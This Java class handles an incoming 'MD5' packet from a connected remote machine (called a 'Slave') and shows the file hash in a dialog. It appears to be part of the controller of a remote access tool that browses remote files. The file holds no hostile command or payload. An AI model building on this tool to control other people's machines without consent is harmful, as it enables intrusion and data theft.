package com.redpois0n.packets.incoming;

import java.io.DataInputStream;

import javax.swing.JOptionPane;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.FrameRemoteFiles;


public class PacketMD5 extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		final String md5 = slave.readLine();
		FrameRemoteFiles frame = FrameRemoteFiles.instances.get(slave);
		if (frame != null) {
			if (frame.waitingForMd5) {
				new Thread() {
					@Override
					public void run() {
						JOptionPane.showMessageDialog(null, "File MD5:\n\n" + md5 + "\n", "MD5", JOptionPane.INFORMATION_MESSAGE);
					}
				}.start();
				frame.waitingForMd5 = false;
			}
		}
	}

}
